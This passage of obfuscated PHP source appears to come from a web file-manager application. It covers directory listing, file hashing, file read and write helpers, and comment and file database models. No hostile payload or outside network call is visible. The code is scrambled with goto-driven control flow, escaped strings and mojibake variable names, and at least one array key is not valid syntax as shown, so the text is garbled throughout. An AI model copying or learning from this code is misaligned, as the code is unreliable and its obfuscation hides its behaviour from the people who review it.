(!($A„ŞŒäÌ» = @opendir($F¶ğ®Ö÷±È))) { return $D†ÔË¢º•; } while (($c ‰‘¡¹¬ˆ = readdir($A„ŞŒäÌ»)) !== !1) { if ($c ‰‘¡¹¬ˆ == $föß¯™Õë[92] || $c ‰‘¡¹¬ˆ == $föß¯™Õë[1123]) { continue; } $F¢ÈÓ—÷ËĞ = $F¶ğ®Ö÷±È . $c ‰‘¡¹¬ˆ; if (is_file($F¢ÈÓ—÷ËĞ)) { $D†ÔË¢º•[$föß¯™Õë[74]][] = $this->fileInfo($F¢ÈÓ—÷ËĞ, $A°˜øšñÈ); } else { $D†ÔË¢º•[$föß¯™Õë[75]][] = $this->folderInfo($F¢ÈÓ—÷ËĞ, $A°˜øšñÈ); } } goto dÃ®¶Œœˆ; dÃ®¶Œœˆ: closedir($A„ŞŒäÌ»); return $D†ÔË¢º•; goto EÎœÁ³¬Š†; EÎœÁ³¬Š†: } public function listAll($d±¼Îâ‡°», &$b÷çÑ‘ÉÅ = array()) { goto d·ôŒ¶; E„Êšæ­¨±: return $b÷çÑ‘ÉÅ; goto cÕ÷ïâºÀ; d·ôŒ¶: $fá¦Î“£˜ =& $_SERVER[÷ÖêïÔÔÓ]; $d±¼Îâ‡°» = $this->iconvSystem($d±¼Îâ‡°»); $d±¼Îâ‡°» = rtrim($d±¼Îâ‡°», $fá¦Î“£˜[8]) . $fá¦Î“£˜[8]; goto DßšÃÆ­ó×; DßšÃÆ­ó×: if (!($bª£ˆ„ßĞÔ = @opendir($d±¼Îâ‡°»))) { return $b÷çÑ‘ÉÅ; } while (($E´†¯™ê©Ñ = readdir($bª£ˆ„ßĞÔ)) !== !1) { if ($E´†¯™ê©Ñ == $fá¦Î“£˜[92] || $E´†¯™ê©Ñ == $fá¦Î“£˜[1123]) { continue; } $D¢¼íŞĞ = $d±¼Îâ‡°» . $E´†¯™ê©Ñ; if (is_dir($D¢¼íŞĞ)) { $b÷çÑ‘ÉÅ[] = array($fá¦Î“£˜[76] => $D¢¼íŞĞ . $fá¦Î“£˜[8], $fá¦Î“£˜[77] => 1, $fá¦Î“£˜[78] => 0); $this->listAll($D¢¼íŞĞ, $b÷çÑ‘ÉÅ); } else { $b÷çÑ‘ÉÅ[] = array($fá¦Î“£˜[76] => $D¢¼íŞĞ, $fá¦Î“£˜[77] => 0, $fá¦Î“£˜[78] => $this->size($D¢¼íŞĞ)); } } closedir($bª£ˆ„ßĞÔ); goto E„Êšæ­¨±; cÕ÷ïâºÀ: } public function has($c¤ĞÀƒºÓ¸, $c¢îõ¸– = false, $c’‚—ÁõØ¡ = true) { goto eñÉİ¨·Õ ; C®²é³³ôç: while (($b‚Â—Ää¸ = readdir($C¶–«ÌÏ¡ß)) !== !1) { if ($b‚Â—Ää¸ == $b„èÅ…«çº[92] || $b‚Â—Ää¸ == $b„èÅ…«çº[1123]) { continue; } $bÛãÄÁ½ó¤ = $c¤ĞÀƒºÓ¸ . $b‚Â—Ää¸; if ($c¢îõ¸–) { if (@is_file($bÛãÄÁ½ó¤)) { $bñˆ¬Ş¬¹++; } else { $fàìİáĞØ°++; } continue; } if ($c’‚—ÁõØ¡) { if (@is_file($bÛãÄÁ½ó¤)) { return !0; } } else { if (@is_dir($bÛãÄÁ½ó¤ . $b„èÅ…«çº[8])) { return !0; } } } closedir($C¶–«ÌÏ¡ß); if ($c¢îõ¸–) { return array($b„èÅ…«çº[188] => $bñˆ¬Ş¬¹, $b„èÅ…«çº[189] => $fàìİáĞØ°); } goto f‡­ƒ½õ¤; f‡­ƒ½õ¤: return !1; goto Eè„ÍÉ¥ÜÕ; eñÉİ¨·Õ : $b„èÅ…«çº =& $_SERVER[÷ÖêïÔÔÓ]; $c¤ĞÀƒºÓ¸ = $this->iconvSystem($c¤ĞÀƒºÓ¸); $c¤ĞÀƒºÓ¸ = rtrim($c¤ĞÀƒºÓ¸, $b„èÅ…«çº[8]) . $b„èÅ…«çº[8]; goto BÆëµÉ§ÍŒ; BÆëµÉ§ÍŒ: if (!($C¶–«ÌÏ¡ß = @opendir($c¤ĞÀƒºÓ¸))) { return !1; } $bñˆ¬Ş¬¹ = 0; $fàìİáĞØ° = 0; goto C®²é³³ôç; Eè„ÍÉ¥ÜÕ: } public function hashSimple($AÈ Á‹Úº) { goto FäŒ „à¯„; A½‰“÷ç×: return md5($CïÏ‚Ö·Ù‘) . $F£ä¸ïƒñá; goto Cò°Òøéâ¾; dšÛ¡î “ï: if ($F£ä¸ïƒñá <= $F³÷ƒÓº× * $D²‘ ôŠø¶) { return $this->hashMd5($AÈ Á‹Úº) . $F£ä¸ïƒñá; } $CïÏ‚Ö·Ù‘ = $cÖ‚×ôÇ³¸[33]; $DÌî©„áïÄ = intval($F£ä¸ïƒñá / $D²‘ ôŠø¶); goto dë“›š¯÷¼; Bº®×šíïŞ: fseek($EÙ÷‚Ô•, $F£ä¸ïƒñá - $F³÷ƒÓº×); $CïÏ‚Ö·Ù‘ .= fread($EÙ÷‚Ô•, $F³÷ƒÓº×); fclose($EÙ÷‚Ô•); goto A½‰“÷ç×; FäŒ „à¯„: $cÖ‚×ôÇ³¸ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$AÈ Á‹Úº) { return md5($cÖ‚×ôÇ³¸[33]); } $AÈ Á‹Úº = $this->iconvSystem($AÈ Á‹Úº); goto bÒÇÃ²çó¯; dë“›š¯÷¼: $EÙ÷‚Ô• = fopen($AÈ Á‹Úº, $cÖ‚×ôÇ³¸[1128]); if (!$EÙ÷‚Ô•) { return $CïÏ‚Ö·Ù‘; } for ($DÊ‘èùŞ¸ = 0; $DÊ‘èùŞ¸ < $D²‘ ôŠø¶; $DÊ‘èùŞ¸++) { fseek($EÙ÷‚Ô•, $DÌî©„áïÄ * $DÊ‘èùŞ¸); $CïÏ‚Ö·Ù‘ .= fread($EÙ÷‚Ô•, $F³÷ƒÓº×); } goto Bº®×šíïŞ; bÒÇÃ²çó¯: $F£ä¸ïƒñá = $this->size($AÈ Á‹Úº); $F³÷ƒÓº× = 200; $D²‘ ôŠø¶ = 50; goto dšÛ¡î “ï; Cò°Òøéâ¾: } public function getContent($cÌé¯‘˜Ö) { $cÌé¯‘˜Ö = $this->iconvSystem($cÌé¯‘˜Ö); return file_get_contents($cÌé¯‘˜Ö); } public function setContent($C‡©£­†ˆ , $Bª¯³ºÎâô = '') { $C‡©£­†ˆ  = $this->iconvSystem($C‡©£­†ˆ ); @file_put_contents($C‡©£­†ˆ , $Bª¯³ºÎâô, LOCK_EX); clearstatcache(); return strlen($Bª¯³ºÎâô) == filesize($C‡©£­†ˆ ); } public function fileSubstr($aî„ÍåĞÃø, $B†È—ŒÃáÂ = 0, $fÔá®ä¤¬· = false) { goto C“Á–Äá¢š; dÜ‚–Úï¶Â: return $Bæ†¥¶´ï; goto BÈ´’İÒÁÒ; C“Á–Äá¢š: $eÀµ×£«÷ =& $_SERVER[÷ÖêïÔÔÓ]; $aî„ÍåĞÃø = $this->iconvSystem($aî„ÍåĞÃø); if ($fÔá®ä¤¬· === !1) { $fÔá®ä¤¬· = $this->size($aî„ÍåĞÃø); } goto CöÒî„•‹; C„œî·­: fseek($eµ‹³œÌ›±, $B†È—ŒÃáÂ); $Bæ†¥¶´ï = fread($eµ‹³œÌ›±, $fÔá®ä¤¬·); fclose($eµ‹³œÌ›±); goto dÜ‚–Úï¶Â; CöÒî„•‹: if ($fÔá®ä¤¬· <= 0) { return $eÀµ×£«÷[33]; } $eµ‹³œÌ›± = fopen($aî„ÍåĞÃø, $eÀµ×£«÷[1128]); if (!$eµ‹³œÌ›±) { return !1; } goto C„œî·­; BÈ´’İÒÁÒ: } public function upload($eÀ´ØçÂ‡´, $e›õãÜÔí, $E’·È×«ô = false, $e¥…œ½ç‹¬ = REPEAT_REPLACE) { $BÑäªÄèßá = $this->copyFile($e›õãÜÔí, $eÀ´ØçÂ‡´); return $BÑäªÄèßá ? $this->getPathOuter($eÀ´ØçÂ‡´) : !1; } public function download($cÚŠ»­•º¨, $b•Ø¥«—Ó) { return $this->iconvSystem($cÚŠ»­•º¨); } } goto a»Å‰ó¡»À; DËòÌÜ‡¡: class CommentModel extends ModelBase { protected $tableName = "\143\157\155\x6d\x65\156\x74"; protected $tableMeta = array("\164\x61\142\154\145\x4e\141\x6d\x65" => "\143\157\x6d\155\145\x6e\164\x5f\x6d\x65\x74\141", "\155\x65\164\141\106\151\145\154\x64" => "\143\157\x6d\155\145\x6e\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($C—–«Î¹”ô) { $b×…å½Í·£ =& $_SERVER[÷ÖêïÔÔÓ]; if ($C—–«Î¹”ô[$b×…å½Í·£[2032]]) { $C¾äß“ = $this->where(array($b×…å½Í·£[2033] => $C—–«Î¹”ô[$b×…å½Í·£[2032]]))->find(); if (!$C¾äß“ || $C¾äß“[$b×…å½Í·£[368]] != $C—–«Î¹”ô[$b×…å½Í·£[368]] || $C¾äß“[$b×…å½Í·£[452]] != $C—–«Î¹”ô[$b×…å½Í·£[452]]) { return !1; } $this->where(array($b×…å½Í·£[2033] => $C—–«Î¹”ô[$b×…å½Í·£[2032]]))->setAdd($b×…å½Í·£[2034], 1); } return $this->add($C—–«Î¹”ô); } public function remove($EœÚ±Îƒ–÷) { $cŒÒ·ºš§§ =& $_SERVER[÷ÖêïÔÔÓ]; $D§†µÖÅ» = array($cŒÒ·ºš§§[2033] => $EœÚ±Îƒ–÷); $Bî¹ÇôÎŸ = $this->where($D§†µÖÅ»)->find(); if ($Bî¹ÇôÎŸ[$cŒÒ·ºš§§[2032]]) { $this->where(array($cŒÒ·ºš§§[2033] => $Bî¹ÇôÎŸ[$cŒÒ·ºš§§[2032]]))->setAdd($cŒÒ·ºš§§[2034], -1); } return $this->where($D§†µÖÅ»)->delete(); } public function edit($C„µ„–—Êù, $fÆ›Š¥Æ„„) { $Bæ¨ª‡‡ =& $_SERVER[÷ÖêïÔÔÓ]; $fô‘¤–Ó = array($Bæ¨ª‡‡[2033] => $C„µ„–—Êù); return $this->where($fô‘¤–Ó)->save(array($Bæ¨ª‡‡[2035] => $fÆ›Š¥Æ„„)); } public function prasise($FÆ¯øÍñ•) { $có†™¶®Â­ =& $_SERVER[÷ÖêïÔÔÓ]; $AÛ¥Ê”Í¸† = Model($có†™¶®Â­[2036]); $EåÍ¦ìÈùö = array($có†™¶®Â­[2033] => $FÆ¯øÍñ•, $có†™¶®Â­[1332] => USER_ID); $BÓÏãÅè‹  = $AÛ¥Ê”Í¸†->where($EåÍ¦ìÈùö)->find(); if (!$BÓÏãÅè‹ ) { $AÛ¥Ê”Í¸†->add($EåÍ¦ìÈùö); $bÛŒ—æÙÑ = $this->where(array($có†™¶®Â­[2033] => $FÆ¯øÍñ•))->setAdd($có†™¶®Â­[2037], 1); } else { $AÛ¥Ê”Í¸†->where($EåÍ¦ìÈùö)->delete(); $bÛŒ—æÙÑ = $this->where(array($có†™¶®Â­[2033] => $FÆ¯øÍñ•))->setAdd($có†™¶®Â­[2037], -1); } return $bÛŒ—æÙÑ; } public function targetInfo($Bì¹ÄãåÑ¦, $d˜µº™ñ‚) { goto bÕ‰âìì”; cƒ‹î‘¬×: return $dºÂÁéÄÌ; goto B™º¦ºë×; bÕ‰âìì”: $E’ÛŠŠœƒÂ =& $_SERVER[÷ÖêïÔÔÓ]; $e‘¯ô†‹¬ø = array($E’ÛŠŠœƒÂ[514] => $Bì¹ÄãåÑ¦, $E’ÛŠŠœƒÂ[515] => $d˜µº™ñ‚); $cùÌÄç†ÅÎ = $this->where($e‘¯ô†‹¬ø)->count(); goto cçÑéÂÀ–‡; cçÑéÂÀ–‡: $eË‹ÌÀĞË = "\122\111\107\x48\124\40\x4a\117\x49\116\x20{$this->tablePrefix}\143\x6f\x6d\155\145\x6e\x74\x5f\160\162\141\151\163\145\x20\163\x74\141\162\x20\157\156\x20\143\157\x6d\x6d\x65\x6e\164\56\x63\x6f\155\155\x65\x6e\164\111\104\x20\75\x20\x73\x74\x61\x72\x2e\x63\157\155\x6d\145\x6e\164\111\104"; $D ¢Óš‰Ş½ = $this->alias($E’ÛŠŠœƒÂ[337])->where($e‘¯ô†‹¬ø)->join($eË‹ÌÀĞË, $E’ÛŠŠœƒÂ[2038])->count(); $dºÂÁéÄÌ = array($E’ÛŠŠœƒÂ[2039] => $cùÌÄç†ÅÎ, $E’ÛŠŠœƒÂ[2040] => $D ¢Óš‰Ş½); goto cƒ‹î‘¬×; B™º¦ºë×: } public function listData($f™ÁŠ´Ş) { $bÉ¹¯·ŞÅ¸ =& $_SERVER[÷ÖêïÔÔÓ]; if (isset($f™ÁŠ´Ş[$bÉ¹¯·ŞÅ¸[2041]])) { if ($f™ÁŠ´Ş[$bÉ¹¯·ŞÅ¸[2041]]) { $f™ÁŠ´Ş[$bÉ¹¯·ŞÅ¸[2042]] = array($bÉ¹¯·ŞÅ¸[924], intval($f™ÁŠ´Ş[$bÉ¹¯·ŞÅ¸[2041]])); } unset($f™ÁŠ´Ş[$bÉ¹¯·ŞÅ¸[2041]]); } if (isset($f™ÁŠ´Ş[$bÉ¹¯·ŞÅ¸[2043]])) { if ($f™ÁŠ´Ş[$bÉ¹¯·ŞÅ¸[2043]]) { $f™ÁŠ´Ş[$bÉ¹¯·ŞÅ¸[2042]] = array($bÉ¹¯·ŞÅ¸[921], intval($f™ÁŠ´Ş[$bÉ¹¯·ŞÅ¸[2043]])); } unset($f™ÁŠ´Ş[$bÉ¹¯·ŞÅ¸[2043]]); } return $this->_listData($f™ÁŠ´Ş); } private function _listData($eªò½Œ¾Íò) { $a–Úí‡ñ¢„ =& $_SERVER[÷ÖêïÔÔÓ]; $AÂ´ö×á£Ì = $this->where($eªò½Œ¾Íò)->_makeOrder()->selectPage(100); $this->_listAppendParent($AÂ´ö×á£Ì[$a–Úí‡ñ¢„[350]]); $this->_listAppendUser($AÂ´ö×á£Ì[$a–Úí‡ñ¢„[350]]); $this->_listAppendMeta($AÂ´ö×á£Ì[$a–Úí‡ñ¢„[350]]); return $AÂ´ö×á£Ì; } private function _makeOrder() { $C“ºØ˜·¤Ì =& $_SERVER[÷ÖêïÔÔÓ]; $e˜¬öÈå = array($C“ºØ˜·¤Ì[2037], $C“ºØ˜·¤Ì[2034], $C“ºØ˜·¤Ì[184]); $AùØ‰‡°Û = Input::get($C“ºØ˜·¤Ì[403], $C“ºØ˜·¤Ì[7], $C“ºØ˜·¤Ì[386], $e˜¬öÈå); $F¨‘Û×£† = Input::get($C“ºØ˜·¤Ì[404], $C“ºØ˜·¤Ì[7], $C“ºØ˜·¤Ì[1334], array($C“ºØ˜·¤Ì[2044], $C“ºØ˜·¤Ì[401])); $DÃŠØ¢àî = $AùØ‰‡°Û . $C“ºØ˜·¤Ì[50] . $F¨‘Û×£†; return $this->order($DÃŠØ¢àî); } private function _listAppendParent(&$E³Ú¦Æ‘Ú´) { goto CæµáŸ» ‹; AÂ™×Ï¦Æ: foreach ($E³Ú¦Æ‘Ú´ as &$b•»ƒ•Û™) { if (isset($fî¯–‚â×[$b•»ƒ•Û™[$eÀßÁÑ“¨‚[2032]]])) { $b•»ƒ•Û™[$eÀßÁÑ“¨‚[2045]] = $fî¯–‚â×[$b•»ƒ•Û™[$eÀßÁÑ“¨‚[2032]]]; } } goto Dà‹îæ³‹Ê; CæµáŸ» ‹: $eÀßÁÑ“¨‚ =& $_SERVER[÷ÖêïÔÔÓ]; $d‡çÌæŒÀ‹ = array_unique(array_to_keyvalue($E³Ú¦Æ‘Ú´, $eÀßÁÑ“¨‚[33], $eÀßÁÑ“¨‚[2032])); $d‡çÌæŒÀ‹ = array_remove_value($d‡çÌæŒÀ‹, $eÀßÁÑ“¨‚[464]); goto AâŞ”Õ‘…ù; AâŞ”Õ‘…ù: if (!$d‡çÌæŒÀ‹) { return; } $fî¯–‚â× = $this->where(array($eÀßÁÑ“¨‚[2033] => array($eÀßÁÑ“¨‚[7], $d‡çÌæŒÀ‹)))->select(); $fî¯–‚â× = array_to_keyvalue($fî¯–‚â×, $eÀßÁÑ“¨‚[2042]); goto AÂ™×Ï¦Æ; Dà‹îæ³‹Ê: } private function _listAppendUser(&$a‹›øÇæ¼) { goto c¿âÛœ»”; CšÓŞö«‚ñ: foreach ($a‹›øÇæ¼ as &$bæÖ«…±„Å) { $bæÖ«…±„Å[$cÁ…ÆÍ‡Œ„[527]] = $e‘âÄè¾¾[$bæÖ«…±„Å[$cÁ…ÆÍ‡Œ„[1341]]]; if (isset($bæÖ«…±„Å[$cÁ…ÆÍ‡Œ„[2045]])) { $bæÖ«…±„Å[$cÁ…ÆÍ‡Œ„[2045]][$cÁ…ÆÍ‡Œ„[527]] = $e‘âÄè¾¾[$bæÖ«…±„Å[$cÁ…ÆÍ‡Œ„[2045]][$cÁ…ÆÍ‡Œ„[1341]]]; } } goto C†ğÖºç‡”; c¿âÛœ»”: $cÁ…ÆÍ‡Œ„ =& $_SERVER[÷ÖêïÔÔÓ]; $a™ëàìƒÏ = array_unique(array_to_keyvalue($a‹›øÇæ¼, $cÁ…ÆÍ‡Œ„[33], $cÁ…ÆÍ‡Œ„[1341])); $a™ëàìƒÏ = array_remove_value($a™ëàìƒÏ, $cÁ…ÆÍ‡Œ„[464]); goto A°ºìµŠ™¸; A°ºìµŠ™¸: if (count($a™ëàìƒÏ) == 0) { return; } foreach ($a‹›øÇæ¼ as $bæÖ«…±„Å) { if (isset($bæÖ«…±„Å[$cÁ…ÆÍ‡Œ„[2045]])) { $a™ëàìƒÏ[] = $bæÖ«…±„Å[$cÁ…ÆÍ‡Œ„[2045]][$cÁ…ÆÍ‡Œ„[1341]]; } } $e‘âÄè¾¾ = Model($cÁ…ÆÍ‡Œ„[469])->userListInfo($a™ëàìƒÏ); goto CšÓŞö«‚ñ; C†ğÖºç‡”: } private function _listAppendMeta(&$D”âøÂİŠ¶) { goto D¶“§òÀ; D¶“§òÀ: $f‰åÉ¥î„ =& $_SERVER[÷ÖêïÔÔÓ]; $döã‡¨ï“Ë = array_unique(array_to_keyvalue($D”âøÂİŠ¶, $f‰åÉ¥î„[33], $f‰åÉ¥î„[2042])); $döã‡¨ï“Ë = array_remove_value($döã‡¨ï“Ë, $f‰åÉ¥î„[464]); goto d‚¸Ô°„’‡; d‚¸Ô°„’‡: if (!$döã‡¨ï“Ë) { return; } foreach ($D”âøÂİŠ¶ as $C–Â†Â‹¤ì) { if (isset($C–Â†Â‹¤ì[$f‰åÉ¥î„[2045]])) { $döã‡¨ï“Ë[] = $C–Â†Â‹¤ì[$f‰åÉ¥î„[2045]][$f‰åÉ¥î„[2042]]; } } $b¿Ñ†Ì×™ = $this->metaList($döã‡¨ï“Ë); goto F·ßêâ»’õ; F·ßêâ»’õ: if (!$b¿Ñ†Ì×™) { return !1; } foreach ($D”âøÂİŠ¶ as &$C–Â†Â‹¤ì) { $C–Â†Â‹¤ì[$f‰åÉ¥î„[413]] = $b¿Ñ†Ì×™[$C–Â†Â‹¤ì[$f‰åÉ¥î„[2042]]]; if (isset($C–Â†Â‹¤ì[$f‰åÉ¥î„[2045]])) { $C–Â†Â‹¤ì[$f‰åÉ¥î„[2045]][$f‰åÉ¥î„[413]] = $b¿Ñ†Ì×™[$C–Â†Â‹¤ì[$f‰åÉ¥î„[2045]][$f‰åÉ¥î„[2042]]]; } } goto C·§÷ïßò; C·§÷ïßò: } private function metaList($Dê¾‡æŒôê) { goto E®ˆ¿«—áë; E®ˆ¿«—áë: $F¹° îÈ…² =& $_SERVER[÷ÖêïÔÔÓ]; if (!$Dê¾‡æŒôê) { return array(); } $eŞĞÍµêØ£ = array($F¹° îÈ…²[2042] => array($F¹° îÈ…²[7], $Dê¾‡æŒôê)); goto Bƒ™ˆ…ßù; Bƒ™ˆ…ßù: $a•ÔõŒÂ = Model($F¹° îÈ…²[2046])->where($eŞĞÍµêØ£)->select(); $a•ÔõŒÂ = array_to_keyvalue_group($a•ÔõŒÂ, $F¹° îÈ…²[2042]); foreach ($a•ÔõŒÂ as $CõÁ¨‰¯ß± => $cµ¤‘´’ñ‘) { $b£ŒâÄÒË– = array(); foreach ($cµ¤‘´’ñ‘ as $c›Â§”é”) { $b£ŒâÄÒË–[$c›Â§”é”[$F¹° îÈ…²[88]]] = $c›Â§”é”[$F¹° îÈ…²[354]]; } $a•ÔõŒÂ[$CõÁ¨‰¯ß±] = $b£ŒâÄÒË–; } goto a°ÛéÓ’; a°ÛéÓ’: return $a•ÔõŒÂ ? $a•ÔõŒÂ : array(); goto e½ˆ‚‰; e½ˆ‚‰: } } class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\146\151\154\x65"; protected $tableMeta = array("\164\x61\142\154\145\x4e\x61\155\145" => "\151\157\x5f\146\x69\154\x65\137\155\x65\164\141", "\x6d\145\164\x61\106\x69\x65\154\144" => "\146\151\154\145\x49\x44"); public function fileInfo($c–ç…›®‡­) { $A¯›ª»¦¶ =& $_SERVER[÷ÖêïÔÔÓ]; static $fİ©ëµ»éÒ = array(); if (!isset($fİ©ëµ»éÒ[$c–ç…›®‡­])) { $bô¢å¿»¸Ê = $A¯›ª»¦¶[2047]; $AÅò¶áØÓ = Model($A¯›ª»¦¶[418])->field($bô¢å¿»¸Ê)->where(array($A¯›ª»¦¶[416] => $c–ç…›®‡­))->find(); $fİ©ëµ»éÒ[$c–ç…›®‡­] = $AÅò¶áØÓ; } return $fİ©ëµ»éÒ[$c–ç…›®‡­]; } public function addFileByContent($Eœ¨é´È¬á = '', $aÏŒ¼…¬ãÈ = '') { goto BÅ™…ÚĞİö; FÈ×©æÁ»: if (file_exists($A…º·Ô²ÉÔ)) { @unlink($A…º·Ô²ÉÔ); } return $Fƒñ«§¸¤Š; goto Fè‹èÛ¶Â”; A†óì©îäÊ: $A…º·Ô²ÉÔ = $B®½êÇÉ¸³ . $B´º¶‚ˆ®•[2049] . rand_string(16); file_put_contents($A…º·Ô²ÉÔ, $Eœ¨é´È¬á); $Fƒñ«§¸¤Š = $this->addFile($A…º·Ô²ÉÔ, $aÏŒ¼…¬ãÈ, !0); goto FÈ×©æÁ»; BÅ™…ÚĞİö: $B´º¶‚ˆ®• =& $_SERVER[÷ÖêïÔÔÓ]; $B®½êÇÉ¸³ = TEMP_PATH . $B´º¶‚ˆ®•[2048]; if (!is_dir($B®½êÇÉ¸³)) { mk_dir($B®½êÇÉ¸³); } goto A†óì©îäÊ; Fè‹èÛ¶Â”: } public function createFileName($AèĞ¡¦ù‚´) { goto dß £„‚Ğ§; dß £„‚Ğ§: $bùÅé¥‹éÛ =& $_SERVER[÷ÖêïÔÔÓ]; $f·¸éòƒÕ = IO::init($bùÅé¥‹éÛ[8]); $e§˜ñİâ¿™ = $this->makeFilePath($AèĞ¡¦ù‚´, $f·¸éòƒÕ); goto B÷òÛ’²‡; B÷òÛ’²‡: $AìÜİƒŠê = $f·¸éòƒÕ->pathFather($e§˜ñİâ¿™); static $eìö…Şìò™ = false; $D®í„ÉÃÏ÷ = $bùÅé¥‹éÛ[2050] . md5($AìÜİƒŠê); goto a³Öí´Íí; a³Öí´Íí: if (!$eìö…Şìò™ && !Cache::get($D®í„ÉÃÏ÷)) { $eìö…Şìò™ = !0; $FšÇãœåé = IO::mkdir($AìÜİƒŠê); if (!IO::exist($FšÇãœåé . $bùÅé¥‹éÛ[2051])) { IO::mkfile($FšÇãœåé . $bùÅé¥‹éÛ[2051]); } Cache::set($D®í„ÉÃÏ÷, 1, 3600 * 2); } return $e§˜ñİâ¿™; goto FÍî¬¬”ÃÎ; FÍî¬¬”ÃÎ: } public function makeFilePath($d»–Ø„ÈÑ, $d”°ïÀ‡ÙŠ) { goto f¹…ÑªÂø¢; dÏ®§íÙê­: $eÌõ·Ää©ø = $eÑŠ˜Ó©¡õ . rand_string(5) . short_id(100); $d»–Ø„ÈÑ = str_replace($bÜâùéåí[8], $bÜâùéåí[71], KodIO::clear($d»–Ø„ÈÑ)); if (!$d»–Ø„ÈÑ) { $aèÚ…±¦™Ü = $bÜâùéåí[2054]; } goto eìá›ÈÊ¼‚; eìá›ÈÊ¼‚: switch ($aèÚ…±¦™Ü) { case $bÜâùéåí[2055]: $eÌõ·Ää©ø = $eÌõ·Ää©ø . $bÜâùéåí[92] . $d”°ïÀ‡ÙŠ->ext($d»–Ø„ÈÑ); if ($d”°ïÀ‡ÙŠ->ext($d»–Ø„ÈÑ) == $bÜâùéåí[1994]) { $eÌõ·Ää©ø .= $bÜâùéåí[2056]; } break; case $bÜâùéåí[2057]: goto C©„ŸŒÔšê; Eåä‰¶´Ö”: break; goto CÀ‚‰¶ê™; C©„ŸŒÔšê: $EÄäæÀ·ÂÇ = Model($bÜâùéåí[1057])->get($bÜâùéåí[2058]); $F¿Û‡²×ß¡ = substr(md5($bÜâùéåí[1815] . $EÄäæÀ·ÂÇ . date($bÜâùéåí[673])), 0, 8); $eÑŠ˜Ó©¡õ = KodIO::defaultIO() . date($bÜâùéåí[2059]) . $F¿Û‡²×ß¡ . $bÜâùéåí[8]; goto dÄ˜¶ÆÆŞ†; dÄ˜¶ÆÆŞ†: if ($d”°ïÀ‡ÙŠ->ext($d»–Ø„ÈÑ) == $bÜâùéåí[1994]) { $d»–Ø„ÈÑ .= $bÜâùéåí[2056]; } $bœôÈÎ¾âÛ = IO::fileNameAuto($eÑŠ˜Ó©¡õ, $d»–Ø„ÈÑ); $eÌõ·Ää©ø = $eÑŠ˜Ó©¡õ . $bœôÈÎ¾âÛ; goto Eåä‰¶´Ö”; CÀ‚‰¶ê™: case $bÜâùéåí[2054]: break; default: break; } return $eÌõ·Ää©ø; goto A‡ö§âÓŞé; f¹…ÑªÂø¢: $bÜâùéåí =& $_SERVER[÷ÖêïÔÔÓ]; $aèÚ…±¦™Ü = Model($bÜâùéåí[1057])->get($bÜâùéåí[2052]); $eÑŠ˜Ó©¡õ = KodIO::defaultIO() . date($bÜâùéåí[2053]); goto dÏ®§íÙê­; A‡ö§âÓŞé: } public function addFileByRemote($AÄñ¥ÔÁ×Ç, $F‚‹ËËõ¢œ, $Eäè§·¾Ù¬ = array()) { goto E¡Ñ¯×‰; E¡Ñ¯×‰: $fËàõÃºÎ =& $_SERVER[÷ÖêïÔÔÓ]; if (!IO::exist($AÄñ¥ÔÁ×Ç)) { return !1; } $bæÃ‰‚ğÙ = $Eäè§·¾Ù¬[$fËàõÃºÎ[160]] ? $Eäè§·¾Ù¬[$fËàõÃºÎ[160]] : $fËàõÃºÎ[33]; goto FÚ‰ˆ™Áƒ›; FÚ‰ˆ™Áƒ›: $cœÄÒ‘Ôñ• = IO::hashMd5($AÄñ¥ÔÁ×Ç, $bæÃ‰‚ğÙ); $EÓ‚‘áö…Ê = KodIO::defaultDriver(); $C¥ÚÅ¢‹ª¥ = array($fËàõÃºÎ[513] => IO::size($AÄñ¥ÔÁ×Ç), $fËàõÃºÎ[2060] => 1, $fËàõÃºÎ[383] => $F‚‹ËËõ¢œ, $fËàõÃºÎ[732] => $EÓ‚‘áö…Ê[$fËàõÃºÎ[364]], $fËàõÃºÎ[384] => $AÄñ¥ÔÁ×Ç, $fËàõÃºÎ[2061] => $Eäè§·¾Ù¬[$fËàõÃºÎ[161]] ? $Eäè§·¾Ù¬[$fËàõÃºÎ[161]] : IO::hashSimple($AÄñ¥ÔÁ×Ç), $fËàõÃºÎ[2062] => $cœÄÒ‘Ôñ• ? $cœÄÒ‘Ôñ• : $bæÃ‰‚ğÙ); goto D‘à‰Ñˆ; D‘à‰Ñˆ: if ($Bõ³¿­Í‚ = $this->addFileCheckExist($C¥ÚÅ¢‹ª¥[$fËàõÃºÎ[161]], $C¥ÚÅ¢‹ª¥[$fËàõÃºÎ[160]], $C¥ÚÅ¢‹ª¥[$fËàõÃºÎ[78]])) { return $Bõ³¿­Í‚; } return $this->addFileData($C¥ÚÅ¢‹ª¥); goto D¶÷ªºùÆò; D¶÷ªºùÆò: } private function addFileData($dÌãÃŒˆ“°) { $BÀÌèçøŠ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$dÌãÃŒˆ“°) { return !1; } $dÌãÃŒˆ“°[$BÀÌèçøŠ[78]] = intval($dÌãÃŒˆ“°[$BÀÌèçøŠ[78]]); if (!$dÌãÃŒˆ“°[$BÀÌèçøŠ[78]] && strlen($dÌãÃŒˆ“°[$BÀÌèçøŠ[161]]) > 32) { $dÌãÃŒˆ“°[$BÀÌèçøŠ[78]] = intval(substr($dÌãÃŒˆ“°[$BÀÌèçøŠ[161]], 32)); } $BŠŒö˜Á¯ = $this->add($dÌãÃŒˆ“°); return $this->find($BŠŒö˜Á¯); } public function addFile($f¶ê¤£óøß, $bãÇ‡•ƒôï, $b÷÷Ê˜÷† = false) { $cŒêí‚Û‘À = IO::hashSimple($f¶ê¤£óøß); $f†—ÕÖ÷¨ = IO::hashMd5($f¶ê¤£óøß); $AàÊ¤‘õ’¯ = IO::size($f¶ê¤£óøß); if ($aÉìÓ¤îÜÚ = $this->addFileCheckExist($cŒêí‚Û‘À, $f†—ÕÖ÷¨, $AàÊ¤‘õ’¯)) { return $aÉìÓ¤îÜÚ; } $EË¿çÙöŞ‡ = $this->addFileMake($f¶ê¤£óøß, $AàÊ¤‘õ’¯, $cŒêí‚Û‘À, $f†—ÕÖ÷¨, $bãÇ‡•ƒôï, $b÷÷Ê˜÷†); return $this->addFileData($EË¿çÙöŞ‡); } public function addFileMake($BòéäÉç…, $B¥ä‡ê¼ã, $AùŠ‡³Ô÷á, $b¤»Ğ²öÌ, 